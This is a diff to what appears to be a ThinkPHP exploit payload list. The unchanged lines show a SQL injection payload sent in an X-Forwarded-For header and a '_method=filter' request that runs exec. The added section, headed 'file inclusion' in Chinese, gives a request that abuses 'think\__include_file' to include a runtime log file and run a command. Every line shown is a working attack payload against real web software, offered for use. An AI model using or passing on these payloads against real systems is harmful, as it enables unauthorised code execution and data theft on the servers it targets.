@@ -118,3 +118,10 @@ header = "X-Forwarded-For:1') and extractvalue(1, concat(0x5c,(select md5(233)))
 35、(post)public/index.php (data)c=exec&f=calc.exe&_method=filter
 
 ```
+
+# 文件包含
+
+```
+_method=__construct&method=get&filter[]=think\__include_file&server[]=phpinfo&get[]=runtime/log/201911/13.log&x=ls
+
+```
